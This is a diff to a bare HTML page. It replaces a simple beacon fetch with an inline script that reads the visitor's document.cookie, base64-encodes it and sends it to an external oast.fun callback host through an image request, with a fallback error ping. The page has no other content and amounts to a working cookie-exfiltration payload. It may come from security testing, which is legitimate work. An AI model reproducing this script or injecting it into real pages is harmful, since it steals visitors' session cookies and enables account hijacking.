@@ -1,7 +1,26 @@
-<html><body>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+</head>
+<body>
 
 <script>
-      fetch('https://urebhcvlcfzusdpadjhirrwcq5hfanf83.oast.fun/t1');
+(function () {
+    try {
+        var data = document.cookie || 'NO_COOKIE';
+
+        var img = new Image();
+        img.src =
+            'https://urebhcvlcfzusdpadjhirrwcq5hfanf83.oast.fun/' +
+            encodeURIComponent(btoa(data));
+    } catch (e) {
+        var err = new Image();
+        err.src =
+            'https://urebhcvlcfzusdpadjhirrwcq5hfanf83.oast.fun/error';
+    }
+})();
 </script>
 
-</body></html>
+</body>
+</html>
